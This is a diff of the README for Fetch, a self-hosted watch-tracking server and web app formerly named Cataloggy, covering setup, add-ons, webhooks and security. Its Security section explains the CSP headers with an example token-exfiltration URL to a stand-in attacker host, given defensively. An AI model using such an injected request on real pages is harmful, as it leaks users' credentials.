@@ -1,6 +1,15 @@
-# Cataloggy
+# Fetch website
 
-Cataloggy is your own personal home page for everything you watch and play. It opens on one shelf — your shows, films and games together, with whatever you're part-way through at the top — instead of making you jump between five different apps to find it.
+The self-hosted half of Fetch: the server and web app that sit next to the
+[Android TV app](../README.md). It is where profiles, addons, lists and settings
+live, and it is your own personal home page for everything you watch and play. It opens on one shelf — your shows, films and games together, with whatever you're part-way through at the top — instead of making you jump between five different apps to find it.
+
+This was a separate project called Cataloggy until it moved into the Fetch
+repository. Existing installs keep working: environment variables
+(`CATALOGGY_*`), the addon ID and its catalog IDs, the Postgres database name
+and browser storage keys keep their old names on purpose. See
+[docs/ECOSYSTEM.md](../docs/ECOSYSTEM.md) for how the website and the TV app
+fit together.
 
 Self-host it on your home server, open it on your phone or computer, and keep track of your shows and movies the way you actually want to. On the TV, a Stremio add-on puts your catalogs in front of the remote.
 
@@ -17,7 +26,7 @@ Self-host it on your home server, open it on your phone or computer, and keep tr
 
 ## Getting Started
 
-The fastest way to try Cataloggy is with Docker Compose — see [Docker Compose install](#docker-compose-install-recommended) below. If you'd rather poke around the code first, jump to [Local development without Docker](#local-development-without-docker).
+The fastest way to try Fetch is with Docker Compose — see [Docker Compose install](#docker-compose-install-recommended) below. If you'd rather poke around the code first, jump to [Local development without Docker](#local-development-without-docker).
 
 ---
 
@@ -26,14 +35,14 @@ The fastest way to try Cataloggy is with Docker Compose — see [Docker Compose 
 The rest of this README covers setup, configuration, and the moving parts under the hood. Two companion docs go deeper:
 
 - **[Troubleshooting](docs/troubleshooting.md)** — what the startup errors mean, why the page loads on the server but not your phone, and why watch history isn't showing up.
-- **[API reference](docs/api.md)** — every endpoint, for scripting against Cataloggy or building your own client.
+- **[API reference](docs/api.md)** — every endpoint, for scripting against Fetch or building your own client.
 
-Cataloggy is a Node.js monorepo set up with `pnpm` workspaces.
+Fetch is a Node.js monorepo set up with `pnpm` workspaces.
 
 ### Structure
 
 ```text
-cataloggy/
+web/
   apps/
     api/        # Fastify API + Prisma
     addon/      # Stremio/Omni addon service
@@ -92,7 +101,7 @@ cataloggy/
    ```
 
    Rolling back is the same two commands with the previous tag. Released versions are listed under
-   [Releases](https://github.com/TheShield2594/cataloggy/releases), each with its changelog section;
+   [Releases](https://github.com/TheShield2594/fetch/releases), each with its changelog section;
    `sha-` tags for individual builds are in the
    [package listing](https://github.com/TheShield2594?tab=packages&repo_name=cataloggy).
    Keep all four images on one tag — the `migrate` image applies the schema the `api` image expects — which is why it's a single setting. The Postgres image and the Node base image the app images are built from are pinned by digest in the repo, so a rebuild uses the exact image the stack was tested against; Dependabot proposes those bumps weekly.
@@ -105,11 +114,11 @@ cataloggy/
 
    This validates API and add-on health endpoints, (when all Trakt env vars are configured) runs `/trakt/import` and verifies a catalog response contains a `metas` array, and (when `STEAM_API_KEY`/`STEAM_ID` are configured) runs `/games/steam/sync` and verifies it returns a sync summary.
 
-   The authenticated checks need the same `API_TOKEN` the stack is running with, so the script reads `.env` from the repository root — the file Compose already uses — rather than expecting you to export it. Anything set in your shell takes precedence, which is how you point it at another host: `API_BASE=http://nas.lan:7000 ADDON_BASE=http://nas.lan:7001 pnpm smoke`.
+   The authenticated checks need the same `API_TOKEN` the stack is running with, so the script reads `.env` from `web/` — the file Compose already uses — rather than expecting you to export it. Anything set in your shell takes precedence, which is how you point it at another host: `API_BASE=http://nas.lan:7000 ADDON_BASE=http://nas.lan:7001 pnpm smoke`.
 
 ## Local development without Docker
 
-1. Install dependencies from the repository root:
+1. Install dependencies from `web/` (every `pnpm` command in this README runs there):
 
    ```bash
    pnpm install
@@ -178,7 +187,7 @@ Your LAN IP is your computer's local network address (usually like `192.168.x.x`
 - **Windows:** Command Prompt → `ipconfig` → look for **IPv4 Address**
 - **Linux:** Terminal → `hostname -I`
 
-### Open Cataloggy on your phone
+### Open Fetch on your phone
 
 On your phone (connected to the same Wi-Fi), open:
 
@@ -197,13 +206,13 @@ http://192.168.1.25:7002
 > **Needs HTTPS.** Browsers only give a site the app-like abilities — installing,
 > the offline cache, push notifications — over `https://` or on `localhost`. A
 > plain `http://192.168.x.x:7002` address is neither, so on the LAN URL above:
-> Chrome shows no install prompt and Cataloggy's own Install button stays
+> Chrome shows no install prompt and Fetch's own Install button stays
 > hidden, nothing is cached for offline use, and push notifications report as
 > unsupported. iOS Safari is a partial exception — **Add to Home Screen** still
 > gives you a full-screen icon, but with no offline and no push behind it.
 >
 > Everything else works fine over the LAN URL; it's only these that need a
-> secure origin. To get them, put Cataloggy behind a proxy with a certificate —
+> secure origin. To get them, put Fetch behind a proxy with a certificate —
 > see [Nginx Proxy Manager Setup](#nginx-proxy-manager-setup) — and install from
 > the `https://` address instead. If you'd rather not, **Settings →
 > Notifications** has channels (ntfy, Gotify, Discord, or any webhook) that
@@ -226,7 +235,7 @@ http://LAN-IP:7001/manifest.json
 
 ### Install the add-on on Android / Android TV
 
-Cataloggy's add-on service speaks the standard Stremio add-on protocol, so it works with the [Stremio app](https://www.stremio.com/downloads) on both Android phones/tablets and Android TV:
+Fetch's add-on service speaks the standard Stremio add-on protocol, so it works with the [Stremio app](https://www.stremio.com/downloads) on both Android phones/tablets and Android TV:
 
 1. Install **Stremio** from the Play Store (or sideload the APK on Android TV devices without Play Store access).
 2. Open Stremio → **Add-ons** → search icon / **"Community Add-ons"** → paste the add-on URL:
@@ -235,15 +244,15 @@ Cataloggy's add-on service speaks the standard Stremio add-on protocol, so it wo
    http://LAN-IP:7001/manifest.json
    ```
 
-3. Confirm installation. Cataloggy's catalogs and metadata now appear inside Stremio's **Board**/**Discover** views.
+3. Confirm installation. Fetch's catalogs and metadata now appear inside Stremio's **Board**/**Discover** views.
 
 > **Important:** Android TV cannot use `localhost` URLs either — use your LAN IP (or your public domain, if set up via the Nginx Proxy Manager section below) so the URL is reachable from the TV.
 
-The Stremio app is the way to use Cataloggy on a TV. The web app is built for touch and pointer input: it has no D-pad/arrow-key focus navigation and no 10-foot layout, so while it will load in an Android TV browser, driving it with a remote is painful. Apple TV has no web browser at all, so Omni plus the add-on is the only route there.
+The Stremio app is the way to use Fetch on a TV. The web app is built for touch and pointer input: it has no D-pad/arrow-key focus navigation and no 10-foot layout, so while it will load in an Android TV browser, driving it with a remote is painful. Apple TV has no web browser at all, so Omni plus the add-on is the only route there.
 
 ### Profiles and the add-on URL
 
-Stremio and Omni have no way to say *who* is watching — the installed URL is the only thing that distinguishes one installation from another. Cataloggy therefore binds a profile to the URL itself:
+Stremio and Omni have no way to say *who* is watching — the installed URL is the only thing that distinguishes one installation from another. Fetch therefore binds a profile to the URL itself:
 
 ```text
 http://LAN-IP:7001/p/PROFILE-ID/manifest.json
@@ -261,7 +270,7 @@ The prefix-less URLs (`http://LAN-IP:7001/manifest.json`, `https://cataloggy.dom
 
 ### Profiles and the media-server webhooks
 
-Plex, Jellyfin and Emby don't send Cataloggy's profile header either, so a scrobble's profile is worked out from the webhook itself:
+Plex, Jellyfin and Emby don't send Fetch's profile header either, so a scrobble's profile is worked out from the webhook itself:
 
 1. **A profile pinned to the URL.** Add `profile=<profile-id>` to the webhook URL you configure in Plex, Jellyfin or Emby, alongside the secret:
 
@@ -272,14 +281,14 @@ Plex, Jellyfin and Emby don't send Cataloggy's profile header either, so a scrob
    All three let you set the target URL per user, so this is the reliable option for a shared server. An unknown or malformed profile ID is rejected rather than quietly redirected.
 
    On Jellyfin, send the secret as an `x-webhook-secret` header instead and leave only `profile` in the URL — see [Webhook secret placement](#webhook-secret-placement) below.
-2. **The media-server account name.** With no `profile` parameter, the Plex account title (or the Jellyfin/Emby username) is matched against your profile names, ignoring case — so a Plex user named `Sam` scrobbles into the Cataloggy profile named `Sam` with nothing to configure.
+2. **The media-server account name.** With no `profile` parameter, the Plex account title (or the Jellyfin/Emby username) is matched against your profile names, ignoring case — so a Plex user named `Sam` scrobbles into the Fetch profile named `Sam` with nothing to configure.
 3. **Your oldest profile**, if neither applies. This is what single-profile installs get, and what every webhook did before profiles were taken into account.
 
 ## Where watch history comes from
 
-Cataloggy records what you've watched from whichever of these you set up — none is required, and they can run side by side:
+Fetch records what you've watched from whichever of these you set up — none is required, and they can run side by side:
 
-| Source | How it reaches Cataloggy |
+| Source | How it reaches Fetch |
 | --- | --- |
 | **Any Stremio-add-on app** | Play detection — see below |
 | **Stremio** | Reads your Stremio account library directly — see below |
@@ -287,20 +296,20 @@ Cataloggy records what you've watched from whichever of these you set up — non
 | **Jellyfin** | Webhook, as it happens |
 | **Emby** | Webhook, as it happens |
 | **The web app** | Marking watched by hand, check-ins, the scrobble API |
-| **Stremio add-on** | The "Cataloggy: Mark Watched" entry in the subtitle menu |
+| **Stremio add-on** | The "Fetch: Mark Watched" entry in the subtitle menu |
 | **Trakt** | Optional — see [Trakt is optional](#trakt-is-optional) |
 | **Other trackers** | One-off CSV/JSON imports (Letterboxd, IMDb, Simkl) — see [Export / import your data](#export--import-your-data) |
 
 ### Play detection (any app that supports Stremio add-ons)
 
-Stremio add-ons are strictly read-only: a client *asks* an add-on for catalogs, metadata, streams and subtitles, and is never able to report back what was watched. There is no callback and no webhook in the protocol. That's why marking watched from an add-on app has always meant picking the fake "Cataloggy: Mark Watched" subtitle by hand.
+Stremio add-ons are strictly read-only: a client *asks* an add-on for catalogs, metadata, streams and subtitles, and is never able to report back what was watched. There is no callback and no webhook in the protocol. That's why marking watched from an add-on app has always meant picking the fake "Fetch: Mark Watched" subtitle by hand.
 
 But the asking itself leaks intent. Two requests mean "the user is about to watch this":
 
 - **`stream`** — they opened a title's stream list
 - **`subtitles`** — a player actually loaded
 
-Cataloggy's add-on now declares the `stream` resource purely to receive that request (it always answers with an empty list, so nothing extra shows up in your client) and forwards both signals to the API. This is the only automatic mechanism available for apps that keep their library entirely to themselves — **Vidi, Omni, Nuvio** and other add-on-consuming clients that never sync to a Stremio account.
+Fetch's add-on now declares the `stream` resource purely to receive that request (it always answers with an empty list, so nothing extra shows up in your client) and forwards both signals to the API. This is the only automatic mechanism available for apps that keep their library entirely to themselves — **Vidi, Omni, Nuvio** and other add-on-consuming clients that never sync to a Stremio account.
 
 Because it infers completion rather than observing it, it's **off by default**. Set `STREMIO_PLAY_DETECTION=true` on **both** the `api` and `addon` services — the add-on observes, the API decides.
 
@@ -314,7 +323,7 @@ Nothing pending is user-visible history; only what survives becomes a watch even
 
 ### Stremio watched sync
 
-Stremio's add-on protocol is read-only: an add-on serves catalogs and metadata, and is never told what you watched. But every Stremio client signed in to a **Stremio account** syncs its library — including watched state — to Stremio's servers, and Cataloggy can read that directly.
+Stremio's add-on protocol is read-only: an add-on serves catalogs and metadata, and is never told what you watched. But every Stremio client signed in to a **Stremio account** syncs its library — including watched state — to Stremio's servers, and Fetch can read that directly.
 
 Connect the account under **Settings → Stremio Watched Sync**. One connection covers every client on that account: desktop, mobile, Android TV, the web app, and third-party clients that sign in with a Stremio account. There's nothing to install per device.
 
@@ -330,9 +339,9 @@ Connect the account under **Settings → Stremio Watched Sync**. One connection 
 Trakt is supported but is not a system of record, and nothing depends on it:
 
 - **Metadata** comes from TMDB, never Trakt.
-- **Importing** from Trakt is a one-time action (**Settings → Trakt Integration → Run Full Import**) and keeps working whether or not you leave the ongoing poll on. One run pulls everything Cataloggy can hold from a Trakt account, so it's enough to stop depending on Trakt afterwards:
+- **Importing** from Trakt is a one-time action (**Settings → Trakt Integration → Run Full Import**) and keeps working whether or not you leave the ongoing poll on. One run pulls everything Fetch can hold from a Trakt account, so it's enough to stop depending on Trakt afterwards:
   - **Watch history** — every play, however far back, each dated as Trakt recorded it, so History and per-year stats go back as far as your account does.
-  - **Ratings** — movies, shows, seasons and individual episodes, all of them. Cataloggy shows your ratings as five stars in half-star steps and stores them out of ten, which is the same ten values: an imported 9 stays a 9 rather than collapsing into a 10. Season and episode ratings live on the seasons list in a show's detail panel, alongside the show's own rating.
+  - **Ratings** — movies, shows, seasons and individual episodes, all of them. Fetch shows your ratings as five stars in half-star steps and stores them out of ten, which is the same ten values: an imported 9 stays a 9 rather than collapsing into a 10. Season and episode ratings live on the seasons list in a show's detail panel, alongside the show's own rating.
   - **Watchlist**, **collection** (into the Collection list) and **personal lists** (each becoming a custom list of the same name — a list already here under that name is filled rather than duplicated, so re-running is safe).
 
   Anything Trakt knows only by its own or TMDB's id is skipped and counted, never guessed at. On a large library the import can take several minutes; afterwards the scheduled poll only fetches what is new. `TRAKT_BACKFILL_MAX_PAGES` caps how far back a single import walks: 100 plays per page, default `500` pages (50,000 plays), hard ceiling `1000` pages (100,000 plays) — a larger value is clamped to that, and a value that isn't a positive whole number falls back to the default.
@@ -340,7 +349,7 @@ Trakt is supported but is not a system of record, and nothing depends on it:
 - **Removals on Trakt never remove anything locally** unless you opt in with `TRAKT_WATCHLIST_MIRROR_DELETES=true`. Even then, a Trakt watchlist that has gone entirely empty is treated as a fault and never mirrored — so a broken or discontinued Trakt cannot empty your library.
 - **Scrobbles and watchlist changes still push out to Trakt** when it's connected. That direction is a mirror: if Trakt stops answering, the pushes fail quietly and nothing local is affected.
 
-Everything Cataloggy knows can be exported as a single JSON file (lists, watch history, series progress, ratings) — see [Export / import your data](#export--import-your-data).
+Everything Fetch knows can be exported as a single JSON file (lists, watch history, series progress, ratings) — see [Export / import your data](#export--import-your-data).
 
 ## Requesting what you add (Jellyseerr / Overseerr)
 
@@ -386,7 +395,7 @@ out by the API.
 
 ## Notifications
 
-Cataloggy can tell you when the next episode of something you're watching airs.
+Fetch can tell you when the next episode of something you're watching airs.
 Two ways to receive that, set up under **Settings → Notifications**:
 
 - **Browser push** — needs no other software, but has prerequisites a LAN
@@ -424,7 +433,7 @@ Configure Nginx Proxy Manager with one Proxy Host for your domain (for example, 
   - `/api/` → port `7000`
   - `/addon/` → port `7001`
 
-There is nothing to set on the `web` service for the domain itself. The web container serves the built bundle with `serve`, which answers whatever `Host` it is given and has no allowlist to configure — so restricting which hostnames reach Cataloggy is the proxy's job, and Nginx Proxy Manager already does it: it forwards only the domains you have configured as Proxy Hosts. If you want everything else refused rather than falling through to whichever host happens to be first, add a default/catch-all Proxy Host that returns a 404.
+There is nothing to set on the `web` service for the domain itself. The web container serves the built bundle with `serve`, which answers whatever `Host` it is given and has no allowlist to configure — so restricting which hostnames reach Fetch is the proxy's job, and Nginx Proxy Manager already does it: it forwards only the domains you have configured as Proxy Hosts. If you want everything else refused rather than falling through to whichever host happens to be first, add a default/catch-all Proxy Host that returns a 404.
 
 Also set `TRUST_PROXY` to the address the `api` container sees Nginx Proxy Manager connect from — its address on the Docker network, not its LAN address. `TRUST_PROXY=172.16.0.0/12` covers the default Docker bridge range and is the usual working answer. Without it the api and addon ignore the `X-Forwarded-For` header the proxy sends, so every request looks like it came from the proxy itself: one shared 200/min rate-limit budget for the whole household (the usual cause of "Too many requests" appearing out of nowhere), and `WEBHOOK_ALLOWED_IPS` can never match.
 
@@ -444,7 +453,7 @@ LAN development URLs stay available, so you can continue using direct local acce
 
 ## Backup & Restore
 
-Cataloggy stores everything in the Postgres database run by the `db` service in `docker-compose.yml`. Two helper scripts wrap `pg_dump`/`psql` for simple backup and restore:
+Fetch stores everything in the Postgres database run by the `db` service in `docker-compose.yml`. Two helper scripts wrap `pg_dump`/`psql` for simple backup and restore:
 
 ```bash
 # Back up the database to backups/cataloggy-<timestamp>.sql.gz
@@ -459,10 +468,10 @@ Both scripts run against the `db` service via `docker compose exec`, so Docker C
 To schedule automatic backups, add a cron entry that runs `backup.sh` on a schedule, e.g. nightly at 3am:
 
 ```cron
-0 3 * * * cd /path/to/cataloggy && ./scripts/backup.sh >> backups/backup.log 2>&1
+0 3 * * * cd /path/to/fetch/web && ./scripts/backup.sh >> backups/backup.log 2>&1
 ```
 
-A dump is a complete copy of your database — every profile's watch history and lists, plus the credentials Cataloggy holds for the services you connected. Those credentials are [encrypted at rest](#secrets-at-rest) with a key derived from `API_TOKEN`, so a dump on its own doesn't hand them over; everything else in it is your viewing history in the clear. Treat the file like a password:
+A dump is a complete copy of your database — every profile's watch history and lists, plus the credentials Fetch holds for the services you connected. Those credentials are [encrypted at rest](#secrets-at-rest) with a key derived from `API_TOKEN`, so a dump on its own doesn't hand them over; everything else in it is your viewing history in the clear. Treat the file like a password:
 
 - `backup.sh` runs under `umask 077` and `chmod`s `$BACKUP_DIR` to `700` and each dump to `600`, so other local users on the host can't read them. Point `BACKUP_DIR` at a directory that only you own.
 - `backups/` and `*.sql.gz` are git-ignored, so a `git add -A` from the repo root can't sweep a dump into git history. If you move backups elsewhere within the repo, keep them ignored.
@@ -489,7 +498,7 @@ If you don't have a recent backup when this happens, don't guess at manually edi
 
 ## Security
 
-Cataloggy is designed for self-hosting on a trusted local network (LAN), not for direct exposure to the internet. Found something outside that model? Report it privately — [.github/SECURITY.md](.github/SECURITY.md) covers where, which versions get fixes, and what is in scope. Known limitations:
+Fetch is designed for self-hosting on a trusted local network (LAN), not for direct exposure to the internet. Found something outside that model? Report it privately — [SECURITY.md](SECURITY.md) covers where, which versions get fixes, and what is in scope. Known limitations:
 
 - The web client stores its API bearer token in `localStorage`. Any JavaScript running on the page (e.g. via an XSS vulnerability in a dependency) could read this token. Since the token only grants access to your own local API, this is an acceptable tradeoff for a LAN-only app. If exposing it via a reverse proxy, both the API and web client now send a restrictive `Content-Security-Policy` (no framing, and no inline script beyond the one the page itself ships, which is allowed by the SHA-256 hash of its exact contents rather than by `'unsafe-inline'`) plus `X-Content-Type-Options`/`X-Frame-Options`/`Referrer-Policy` headers to reduce the impact of a dependency-introduced XSS bug, but migrating to httpOnly session cookies would be a stronger fix if you need this on the internet.
 - That CSP's `connect-src` names only the origins this deployment actually talks to — `'self'`, plus `VITE_API_BASE`, `VITE_ADDON_BASE`, (if set) the `SENTRY_DSN` host, and the artwork CDNs the service worker caches posters from — rather than allowing every host, so script injected into the page cannot post your token to an arbitrary server. `img-src` names the same artwork CDNs (plus `'self'` and `data:`) for the same reason: an `<img>` is a request too, and pointing one at `https://attacker.example/?t=<token>` would carry the token out just as well as a `fetch` would, so leaving that directive open to every host would have undone the rest. `form-action 'self'` closes the third route out — `default-src` does not cover it, so without it injected markup could auto-submit a form off-origin. The header is rendered from `apps/web/serve.template.json` when the `web` container starts, since those origins are only known then. If some browser needs to reach an origin the container doesn't know about (most likely a per-browser API base set in Settings), add it to `CSP_CONNECT_SRC_EXTRA` — otherwise the browser will block the request. `style-src` still allows `'unsafe-inline'`, which the app's inline React styles require; style injection is far lower-risk than script injection, so that one is an accepted weakening.
@@ -497,14 +506,14 @@ Cataloggy is designed for self-hosting on a trusted local network (LAN), not for
 - The separate add-on service (port `7001`, the full-featured one Settings links to) is still unauthenticated: anyone who can reach it can read the lists of the profile named in its URL (or the oldest profile, for the prefix-less URL). That is inherent to the protocol — Stremio cannot send a token — so keep that port on your LAN, and do not proxy it to the internet unless you are comfortable with your watchlist being public. Its write endpoints are separately protected. The scrobble endpoint takes a bearer token derived from `API_TOKEN`, which the service never emits. "Mark Watched" cannot use that token — Stremio can only fetch a plain URL, so the credential has to be in the URL, and the subtitles response carrying it is served to anyone who asks — so each of those URLs carries a capability signed for the one profile and the one title or episode it was built for, expiring after twelve hours. Reading one out of a subtitles response (or a proxy log) therefore allows re-marking that single title, not writing arbitrary history.
 - Connecting a Stremio account stores only the access key Stremio issues, never your password — the password is sent once to Stremio's login endpoint, exchanged for the key, and discarded. The key is not scoped: it grants the same library access a signed-in Stremio client has. It is encrypted at rest along with the other stored credentials (see below). Disconnecting from Settings deletes it. `POST /stremio/library/connect` is rate-limited to 10/min/IP like the other credential-accepting routes.
 - Linking a Trakt account is CSRF-protected: `GET /trakt/oauth/authorize` (which requires the API token) mints a single-use `state` that expires in 10 minutes, and the callback rejects anything else — so a link someone else sends you cannot silently bind your install to their Trakt account.
-- If you do expose Cataloggy beyond your LAN, put it behind a reverse proxy with TLS (e.g. Nginx Proxy Manager) and consider implementing a proper session-based auth flow.
+- If you do expose Fetch beyond your LAN, put it behind a reverse proxy with TLS (e.g. Nginx Proxy Manager) and consider implementing a proper session-based auth flow.
 - All API routes are rate-limited globally (200 req/min/IP), with tighter per-route limits on sensitive endpoints: PIN verification (`POST /profiles/:id/verify`, 10/min/IP), the Trakt OAuth authorize/callback routes (10/min/IP), the Plex/Jellyfin/Emby webhooks (60/min/IP) and the built-in Stremio manifest/catalog routes (240/min/IP — they answer unauthenticated callers, but a Stremio home screen fetches one request per catalog, so the budget covers several refreshes a minute rather than a single request). Calls from the Stremio addon service get their own 1000 req/min bucket rather than sharing the browser's — every Stremio client reaches the API from that one container's IP. The addon identifies itself with a token derived from `API_TOKEN` (never the raw token, which the browser also holds), so nothing extra needs configuring and a leaked browser token cannot drain the addon's budget. The limiter's counters are in-memory and per-process, so they assume the documented single-`api`-container deployment; running multiple API replicas would give each its own independent budget.
 - The media-server webhook endpoints (`/webhooks/plex`, `/webhooks/jellyfin`, `/webhooks/emby`) authenticate with a single shared secret (`WEBHOOK_SECRET`) sent as a query param or header — none of the three sign their outgoing webhooks, so this is the strongest verification available. Treat `WEBHOOK_SECRET` like a password and **do not expose these endpoints to the public internet**; keep them reachable only from your LAN/reverse-proxy-internal network, where the media servers themselves run. If you must route them through a reverse proxy, set `WEBHOOK_ALLOWED_IPS` to a comma-separated allowlist of your media servers' IPs (requires `TRUST_PROXY` to be configured correctly) as a second layer of defense. Where you put the secret matters — see [Webhook secret placement](#webhook-secret-placement).
 - Container logs are capped at 10MB × 3 files per service (`docker-compose.yml`'s `x-logging` block) so they can't grow unbounded on the host over a long-running, unattended deployment.
 
 ### Secrets at rest
 
-Every credential Cataloggy stores on your behalf is encrypted in the database with AES-256-GCM:
+Every credential Fetch stores on your behalf is encrypted in the database with AES-256-GCM:
 
 | What | Where it lives |
 | --- | --- |
@@ -541,7 +550,7 @@ Rows written before this shipped are read back unchanged and encrypted in place 
 | `x-webhook-secret` header | Your media server can set custom headers — **Jellyfin can** | Headers are not part of the URL, so nothing logs them |
 | `?token=` query parameter | Your media server cannot — **Plex cannot** | The URL is written to every access log on the way in |
 
-Anything in a query string ends up in access logs in plaintext, and those logs are kept far longer than the request. Cataloggy redacts `token` from its own logs (`?token=REDACTED`), but a reverse proxy in front of it keeps its own copy that Cataloggy cannot reach. **Prefer the header wherever the sender supports it.** If both are sent, the header is what's checked; the API also logs a one-time warning per process when a webhook authenticates via the query string.
+Anything in a query string ends up in access logs in plaintext, and those logs are kept far longer than the request. Fetch redacts `token` from its own logs (`?token=REDACTED`), but a reverse proxy in front of it keeps its own copy that Fetch cannot reach. **Prefer the header wherever the sender supports it.** If both are sent, the header is what's checked; the API also logs a one-time warning per process when a webhook authenticates via the query string.
 
 Jellyfin's Webhook plugin has a *Headers* section — add `x-webhook-secret` with your secret there and drop `token` from the URL:
 
@@ -557,7 +566,7 @@ Emby posts JSON to whatever URL you give it, and takes the secret either way:
 http://LAN-IP:7000/webhooks/emby?token=WEBHOOK_SECRET&profile=PROFILE-ID
 ```
 
-If your Emby build's webhook settings offer a custom-headers field, move the secret into `x-webhook-secret` and drop `token` from the URL, the same as on Jellyfin. Emby sends a watch when it reports `playback.stop`; its other events (`playback.start`, `item.markplayed`, the library ones) are answered `200 ignored` and recorded as nothing. An item Emby holds no IMDb id for — the usual case is a series scraped from TVDB alone — is answered `200 skipped` with `no_imdb_id`, because IMDb ids are what Cataloggy keys history by.
+If your Emby build's webhook settings offer a custom-headers field, move the secret into `x-webhook-secret` and drop `token` from the URL, the same as on Jellyfin. Emby sends a watch when it reports `playback.stop`; its other events (`playback.start`, `item.markplayed`, the library ones) are answered `200 ignored` and recorded as nothing. An item Emby holds no IMDb id for — the usual case is a series scraped from TVDB alone — is answered `200 skipped` with `no_imdb_id`, because IMDb ids are what Fetch keys history by.
 
 ## Useful Commands
 
@@ -582,7 +591,7 @@ If your Emby build's webhook settings offer a custom-headers field, move the sec
 - Push Prisma schema to DB (API package):
 
   ```bash
-  pnpm --filter @cataloggy/api prisma:push
+  pnpm --filter @fetch/api prisma:push
   ```
 
 ## Contributing
@@ -597,4 +606,4 @@ Created and maintained by [TheShield2594](https://github.com/TheShield2594).
 
 ## License
 
-Cataloggy is licensed under the [MIT License](LICENSE).
+Fetch is licensed under the [MIT License](LICENSE).
